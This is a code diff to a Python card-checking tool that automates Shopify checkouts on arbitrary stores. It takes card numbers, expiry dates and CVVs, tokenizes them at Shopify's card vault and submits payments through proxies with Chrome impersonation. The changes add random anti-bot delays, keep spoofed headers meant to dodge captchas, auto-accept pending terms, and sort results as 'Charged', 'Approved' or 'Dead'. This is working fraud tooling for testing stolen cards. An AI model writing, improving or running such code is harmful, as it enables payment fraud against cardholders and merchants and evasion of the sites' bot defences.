@@ -119,7 +119,6 @@ async def fetch_products(domain, proxy_str=None):
                     else:
                         price = float(price)
 
-                    # Skip free ($0) products
                     if price <= 0:
                         continue
 
@@ -306,7 +305,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
     s_country_code = shipping_addr["countryCode"]
     
     try:
-        # 1. Fetch cheapest product variant if not provided
         if not variant_id:
             await queue.put({"type": "log", "msg": "[STEP 1] Fetching products from /products.json..."})
             info = await fetch_products(ourl, proxy_str)
@@ -337,16 +335,15 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
         }
 
         async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=30) as session:
-            # Visit product page to set cookies
             await queue.put({"type": "log", "msg": "[STEP 2] Visiting product page & initializing cart..."})
             try:
                 await session.get(product_link, headers=product_headers)
+                await asyncio.sleep(random.uniform(0.5, 1.5)) # Delay anti-bot
                 await session.get(f"{ourl}/cart.js", headers=product_headers)
                 await queue.put({"type": "log", "msg": "[STEP 2 OK] Cookies dropped successfully."})
             except Exception as e:
                 await queue.put({"type": "log", "msg": f"[WARN STEP 2] Error visiting page: {str(e)[:50]}"})
 
-            # Add cheapest item to cart
             await queue.put({"type": "log", "msg": f"[STEP 3] Adding variant {variant_id} to cart..."})
             add_headers = {
                 **product_headers,
@@ -365,7 +362,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 await queue.put({"type": "log", "msg": f"[ERROR STEP 3] Cart addition failed: {str(e)}"})
                 return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency
 
-            # Get cart token from /cart.js
             cart_token = ""
             try:
                 resp = await session.get(f"{ourl}/cart.js", headers=product_headers)
@@ -375,7 +371,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             except Exception:
                 pass
 
-            # Trigger checkout redirect
             await queue.put({"type": "log", "msg": "[STEP 4] Triggering checkout flow..."})
             checkout_headers = {
                 **product_headers,
@@ -387,6 +382,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             
             try:
                 await session.get(f"{ourl}/checkout", headers=checkout_headers)
+                await asyncio.sleep(random.uniform(1.0, 2.0)) # Delay anti-bot
                 resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'}, allow_redirects=True)
                 checkout_url = str(resp.url)
                 text = resp.text
@@ -399,7 +395,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 await queue.put({"type": "log", "msg": "[ERROR STEP 4] Site requires login!"})
                 return False, "Site requires login!", gateway, total_price, currency
 
-            # Extract checkout and session tokens
             await queue.put({"type": "log", "msg": "[STEP 5] Extracting Session Token (SST)..."})
             sst = None
             sst_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', text)
@@ -420,25 +415,21 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             
             await queue.put({"type": "log", "msg": f"[STEP 5 OK] SST Extracted: {sst[:30]}..."})
 
-            # Extract queueToken, stableId, paymentMethodIdentifier
             queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
             stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or "1"
             paymentMethodIdentifier = extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or extract_between(text, '"paymentMethodIdentifier":"', '"') or "credit_card"
 
-            # Parse currency and price from HTML
             currency = 'USD'
             if 'currencyCode&quot;:&quot;' in text:
                 currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
             elif '"currencyCode":"' in text:
                 currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
 
-            # Try to parse the checkout token (e.g. from /checkouts/cn/xxxxx)
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
             c_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
             if not c_token or len(c_token) < 5 or 'checkout' in c_token:
                 c_token = cart_token or "1"
 
-            # 2. Tokenize card at deposit.us.shopifycs.com/sessions
             await queue.put({"type": "log", "msg": "[STEP 6] Tokenizing card at shopifycs.com..."})
             session_endpoints = [
                 "https://deposit.us.shopifycs.com/sessions",
@@ -487,10 +478,8 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 await queue.put({"type": "log", "msg": f"[ERROR STEP 6] Tokenization failed: {token_error}"})
                 return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
-            # DELAY ANTI-BOT: Slow down to mimic human behavior before GraphQL
-            await asyncio.sleep(random.uniform(1.5, 3.0))
+            await asyncio.sleep(random.uniform(2.0, 4.0)) # DELAY ANTI-BOT KETAT SEBELUM GRAPHQL
 
-            # 3. Submit GraphQL payment directly
             await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
             graphql_headers = {
@@ -503,14 +492,12 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 'X-Checkout-Web-Deploy-Stage': 'production',
                 'X-Checkout-Web-Server-Handling': 'fast',
                 'X-Checkout-Web-Source-Id': c_token,
-                # --- TAMBAHAN SECURITY HEADERS UNTUK ELAKKAN CAPTCHA ---
                 'Sec-Fetch-Dest': 'empty',
                 'Sec-Fetch-Mode': 'cors',
                 'Sec-Fetch-Site': 'same-origin',
                 'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                 'Sec-Ch-Ua-Mobile': '?0',
                 'Sec-Ch-Ua-Platform': '"Windows"'
-                # -------------------------------------------------------
             }
 
             random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
@@ -661,13 +648,11 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                             'shippingScriptChanges': [],
                         },
                         'optionalDuties': {'buyerRefusesDuties': False},
-                        # --- TAMBAH BAHAGIAN INI UNTUK ACCEPT PENDING TERMS ---
                         'negotiationStrategy': {
                             'acceptedTerms': True,
                             'acceptUnexpectedDiscounts': True,
                             'acceptUnexpectedTaxes': True
                         },
-                        # -------------------------------------------------------
                     },
                     'attemptToken': f'{c_token}-{random.random()}',
                     'metafields': [],
@@ -716,7 +701,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                         soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                         only_soft_errors = all(code in soft_errors for code in error_codes)
                         if only_soft_errors and submit_attempt == 0:
-                            # Refresh attemptToken untuk retry
                             graphql_payload['variables']['attemptToken'] = f'{c_token}-{random.random()}'
                             await asyncio.sleep(2)
                             continue
@@ -738,7 +722,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                     await queue.put({"type": "log", "msg": f"[ERROR STEP 7] Exception: {str(e)}"})
                     return False, f"GraphQL submission failed: {str(e)}", gateway, total_price, currency
 
-            # 4. Poll for receipt status
             if receipt_id:
                 await queue.put({"type": "log", "msg": "[STEP 8] Polling for receipt status (Waiting bank response)..."})
                 poll_payload = {
@@ -777,7 +760,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             else:
                 await queue.put({"type": "log", "msg": "[WARN STEP 8] No Receipt ID to poll."})
 
-            # 5. Fallback final check
             await queue.put({"type": "log", "msg": "[STEP 9] Running fallback HTML check..."})
             try:
                 checkout_url_final = f"{ourl}/checkout?from_processing_page=1&validate=true"
@@ -792,7 +774,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 final_lower = final_text.lower()
                 if "challenge" in final_url.lower() or "challenge" in final_lower or "recaptcha" in final_lower or "hcaptcha" in final_lower:
                     await queue.put({"type": "log", "msg": "[FAILED] Captcha/Challenge detected in fallback."})
-                    return True, "CARD_DECLINED", gateway, total_price, currency
+                    return True, "CAPTCHA_DETECTED", gateway, total_price, currency
                 
                 is_3ds = (
                     "three_d_secure" in final_url.lower() or 
@@ -907,7 +889,6 @@ def _classify_response(response_text: str) -> tuple:
         'payments_proposed_gateway_unavailable', 'payments_payment_flexibility_terms_id_mismatch'
     ]
 
-    # Check outcomes FIRST to ensure real card responses are never classified as system errors
     if any(k in resp_lower for k in charged_patterns):
         return "Charged", resp, "-"
     if any(k in resp_lower for k in tds_patterns):
@@ -922,7 +903,6 @@ def _classify_response(response_text: str) -> tuple:
         return "Approved", resp, "-"
         
     if any(k in resp_lower for k in declined_patterns):
-        # Hantar mesej asal (resp) supaya sama dengan raw response
         return "Dead", resp, "-"
     if any(k in resp_lower for k in system_error_patterns):
         return "Error", resp, "-"
@@ -937,7 +917,6 @@ def _classify_response(response_text: str) -> tuple:
 async def run_background_process(job_id: str, card_str: str, site_url: str, proxy_str: str):
     queue = asyncio.Queue()
     
-    # Simpan queue dalam global memory dari main.py
     from main import active_streams
     active_streams[job_id] = queue
 
@@ -954,22 +933,21 @@ async def run_background_process(job_id: str, card_str: str, site_url: str, prox
     await queue.put({"type": "log", "msg": "[INIT] Stream connected. Engine processing..."})
 
     try:
-        # PASTIKAN QUEUE DIHANTAR SEBAGAI ARGUMEN PERTAMA
         success, message, gateway, price, currency = await process_card(
             queue, cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site, proxy_str=proxy_str
         )
         
-        status, _, _ = _classify_response(message)
+        # Pastikan kita sentiasa pass 'message' yang asal dari process_card
+        # Supaya bila sampai depan UI, result atas sama dengan raw response
+        final_msg = message if message else "UNKNOWN_ERROR"
+        status, _, _ = _classify_response(final_msg)
         
-        # Hantar result akhir
-        await queue.put({"type": "result", "status": status, "message": message, "price": price})
+        await queue.put({"type": "result", "status": status, "message": final_msg, "price": price})
         
     except Exception as e:
         await queue.put({"type": "error", "msg": f"Fatal: {str(e)}"})
     finally:
-        # Hantar penanda akhir untuk tutup stream
         await queue.put({"type": "done"})
-        # Buang dari memory selepas 5 saat
         await asyncio.sleep(5)
         if job_id in active_streams: del active_streams[job_id]
 
@@ -984,11 +962,9 @@ async def get_stream_generator(job_id: str):
 
     while True:
         try:
-            # Tunggu data dari background task (timeout 30 saat)
             data = await asyncio.wait_for(queue.get(), timeout=30.0)
             if data.get("type") == "done":
                 break
             yield f"data: {json.dumps(data)}\n\n"
         except asyncio.TimeoutError:
-            # Hantar Keep-Alive jika backend terlalu lama processing
             yield f"data: {json.dumps({'type': 'log', 'msg': '[KEEP-ALIVE] Waiting for backend process...'})}\n\n"
